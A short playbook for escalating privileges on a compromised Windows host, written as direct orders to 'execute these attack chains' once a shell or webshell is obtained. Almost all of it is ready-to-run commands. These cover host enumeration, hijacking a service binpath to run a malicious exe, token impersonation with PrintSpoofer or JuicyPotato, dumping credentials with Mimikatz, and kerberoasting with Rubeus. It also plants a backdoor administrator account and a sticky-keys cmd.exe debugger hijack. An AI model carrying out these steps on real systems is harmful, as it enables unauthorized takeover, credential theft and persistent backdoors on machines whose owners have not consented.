# Windows Privilege Escalation Playbook

When a Windows target is accessed (via shell or webshell), execute these attack chains:

## 1. Local Recon (Enumeration)
- **OS Version**: `systeminfo`, `wmic os get caption`, `hostname`.
- **User/ID**: `whoami /all`, `net user`, `net localgroup administrators`.
- **Permissions**: `accesschk.exe -uwcqv "Authenticated Users" *`.

## 2. Service & Registry Misconfigs
- **Unquoted Service Paths**: `wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """`.
- **AlwaysInstallElevated**: `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`.
- **Writable Service**: Use `sc config` to change the `binpath` to a malicious `.exe`.

## 3. Token Impersonation
- **Check Privileges**: If `SeImpersonatePrivilege` is enabled, use `JuicyPotato` or `PrintSpoofer`.
- **In-Memory Credentials**: If `SeDebugPrivilege` is enabled, use `Mimikatz` (run `sekurlsa::logonpasswords`).

## 4. Active Directory Pivot
- **Domain Controllers**: `net domain`, `nltest /dclist:<domain>`.
- **BloodHound**: Use `Sharphound.exe` to map the AD structure.
- **Kerberos**: `Rubeus.exe kerberoast` or `AS-REP Roasting`.

## 5. Persistence & Administrative Takeover
- **New Admin User**: `net user /add scripty pass123 && net localgroup administrators scripty /add`.
- **Sticky Keys**: `reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"`.
